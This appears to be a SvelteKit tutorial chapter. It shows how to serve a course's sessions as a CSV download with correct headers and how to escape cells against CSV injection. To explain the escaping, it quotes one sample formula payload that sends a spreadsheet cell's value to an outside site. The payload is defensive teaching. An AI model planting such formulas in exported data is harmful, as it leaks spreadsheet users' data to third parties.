---
title: A download, and CSV written safely
version: 1
---

**An endpoint can answer with any kind of file, because a `Response` is only a body and some
headers.** A student who wants their sessions in a spreadsheet needs a CSV file, and the course page is
the place to offer it. Save this as `src/routes/(planner)/courses/[id=slug]/sessions.csv/+server.js`:

```schooling-example
{"language": "javascript", "file": "src/routes/(planner)/courses/[id=slug]/sessions.csv/+server.js", "parts": [
 {"code": "// +server.js: a course's sessions as a CSV file, for a spreadsheet.\nimport { error } from '@sveltejs/kit';\nimport { readPlanner } from '#lib/server/planner.js';"},
 {"code": "export async function GET({ params }) {\n\tconst { courses, sessions } = await readPlanner();\n\tconst course = courses.find((c) => c.id === params.id);\n\tif (!course) error(404, `There is no course called “${params.id}”.`);\n\n\tconst rows = sessions\n\t\t.filter((s) => s.course === course.id)\n\t\t.toSorted((a, b) => (a.date < b.date ? -1 : 1))\n\t\t.map((s) => [course.name, s.date, s.minutes, s.done ? 'yes' : 'no']);", "note": "The folder is inside the course's, so `params.id` is the course here too, checked by the same matcher."},
 {"code": "\tconst text = [['course', 'date', 'minutes', 'done'], ...rows].map((row) => row.map(cell).join(',')).join('\\r\\n') + '\\r\\n';\n\n\treturn new Response(text, {\n\t\theaders: {\n\t\t\t'Content-Type': 'text/csv; charset=utf-8',", "note": "CSV lines end in a carriage return and a line feed, which is what the format's specification asks for and what spreadsheets expect."},
 {"code": "\t\t\t'Content-Disposition': `attachment; filename=\"${course.id}-sessions.csv\"`\n\t\t}\n\t});\n}", "note": "`attachment` asks the browser to save the file rather than show it, under this name."},
 {"code": "// A value as a CSV cell: with a leading apostrophe if a spreadsheet would take it for a\n// formula, and in quotes if it holds a comma, a quote or a line break.\nfunction cell(value) {\n\tlet text = String(value);\n\tif (/^[=+\\-@]/.test(text)) text = `'${text}`;\n\treturn /[\",\\r\\n]/.test(text) ? `\"${text.replaceAll('\"', '\"\"')}\"` : text;\n}", "note": "Two rules, and the second is about safety rather than format."}
]}
```

```
ana@dev:~/planner$ curl -si http://localhost:5173/courses/algebra/sessions.csv
HTTP/1.1 200 OK
Vary: Origin
content-disposition: attachment; filename="algebra-sessions.csv"
content-type: text/csv; charset=utf-8
referrer-policy: same-origin
x-content-type-options: nosniff
x-frame-options: DENY
content-length: 127
Date: Sat, 24 Oct 2026 01:13:10 GMT
Connection: keep-alive
Keep-Alive: timeout=5

course,date,minutes,done
Linear algebra,2026-10-13,60,yes
Linear algebra,2026-10-19,90,yes
Linear algebra,2026-10-24,60,no
```

**Why the apostrophe.** A spreadsheet that opens a CSV file treats a cell beginning with `=`, `+`, `-`
or `@` as a formula and runs it. A course named `=HYPERLINK("https://example.com/?"&A2,"Open")` would
become a link that sends the cell beside it to another site when somebody clicks it, and other formulas
have done worse. The names in the planner are written by its owner, so the danger is small here. In an
application where the text comes from other people, it is a real attack, called **CSV injection**, and
the usual defence is the apostrophe, which makes the spreadsheet show the text as text.

## A link to it

The course page offers the file with an ordinary link. Replace
`src/routes/(planner)/courses/[id=slug]/+page.svelte`:

```schooling-example
{"language": "html", "file": "src/routes/(planner)/courses/[id=slug]/+page.svelte", "parts": [
 {"code": "<script>\n\timport { enhance } from '$app/forms';\n\timport { format } from '#lib/week.js';\n\timport { getPlanner } from '#lib/context.js';\n\timport WeekNav from '#lib/WeekNav.svelte';\n\timport WeekTotal from '#lib/WeekTotal.svelte';\n\timport List from '#lib/List.svelte';\n\timport AddSession from '#lib/AddSession.svelte';\n\n\tlet { data } = $props();\n\n\tconst planner = getPlanner();\n\tlet course = $derived(data.course);\n\tlet sessions = $derived(planner.sessionsFor(course.id));\n</script>\n\n<svelte:head>\n\t<title>{course.name} · Study planner</title>\n</svelte:head>\n<h1>{course.name}</h1>\n<WeekNav week={planner.week} />\n<List items={sessions}>\n\t{#snippet row(session)}\n\t\t<form method=\"POST\" action=\"?week={planner.week}&/done\" use:enhance>\n\t\t\t<input type=\"hidden\" name=\"id\" value={session.id} />\n\t\t\t<input type=\"hidden\" name=\"done\" value={session.done ? 'no' : 'yes'} />\n\t\t\t<span class:done={session.done}>{format(session.date)}, {session.minutes} min</span>\n\t\t\t<button aria-label=\"{session.done ? 'Mark not done' : 'Mark done'}: {format(session.date)}\">\n\t\t\t\t{session.done ? 'Mark not done' : 'Mark done'}\n\t\t\t</button>\n\t\t</form>\n\t{/snippet}\n\t{#snippet empty()}\n\t\t<p>Nothing planned for {course.name} this week.</p>\n\t{/snippet}\n</List>\n<WeekTotal minutes={planner.byCourse[course.id] ?? 0} label=\"for {course.name} this week\" />\n{#key planner.week}\n\t<AddSession action=\"?week={planner.week}&/add\" />\n{/key}"},
 {"code": "<p><a href=\"/courses/{course.id}/sessions.csv\" download>Download all {course.name} sessions (CSV)</a></p>", "note": "`download` makes the browser save what the link points to, and SvelteKit's router leaves such links to the browser. The file holds every session of the course, not only this week's, and the link text says so."},
 {"code": "<style>\n\t.done {\n\t\ttext-decoration: line-through;\n\t}\n</style>"}
]}
```

```
ana@dev:~/planner$ look http://localhost:5173/courses/algebra | tail -3
  - paragraph:
    - link "Download all Linear algebra sessions (CSV)":
      - /url: /courses/algebra/sessions.csv
```
